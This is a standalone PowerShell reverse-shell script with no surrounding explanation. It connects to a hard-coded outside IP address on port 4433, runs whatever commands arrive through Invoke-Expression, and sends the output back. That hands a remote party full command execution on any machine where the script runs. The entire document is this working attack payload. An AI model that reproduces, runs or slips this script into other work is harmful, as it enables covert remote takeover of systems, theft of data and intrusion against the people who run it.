$client = New-Object System.Net.Sockets.TCPClient('154.205.145.20',4433);
$stream = $client.GetStream();
$writer = New-Object System.IO.StreamWriter($stream);
$buffer = New-Object System.Byte[] 1024;
while(($i = $stream.Read($buffer, 0, $buffer.Length)) -ne 0) {
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($buffer,0,$i);
    $sendback = (Invoke-Expression $data 2>&1 | Out-String);
    $writer.Write($sendback);
    $writer.Flush();
}
$client.Close();
